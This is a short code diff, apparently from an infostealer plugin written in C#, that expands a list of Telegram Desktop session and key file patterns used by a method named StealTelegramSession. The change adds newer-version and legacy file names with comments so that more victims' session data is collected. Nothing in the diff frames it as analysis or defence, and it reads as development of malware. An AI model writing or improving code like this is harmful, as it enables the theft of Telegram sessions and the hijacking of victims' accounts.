@@ -14,11 +14,13 @@ namespace Plugin.Messaging
         
         private static readonly string[] ImportantFiles = new string[]
         {
-            "D877F783D5D3EF8C*",
-            "map*",
-            "key_datas",
-            "usertag",
-            "settings*"
+            "D877F783D5D3EF8C*",  // Session files (may have more digits in newer versions)
+            "D877F783D5D3EF8C1*", // Telegram Desktop 4.0+ pattern
+            "map*",               // Key mapping
+            "key_datas",          // Encrypted keys
+            "key_data",           // Legacy key file
+            "usertag",            // User tag
+            "settings*"           // Settings files
         };
         
         public static Dictionary<string, byte[]> StealTelegramSession()
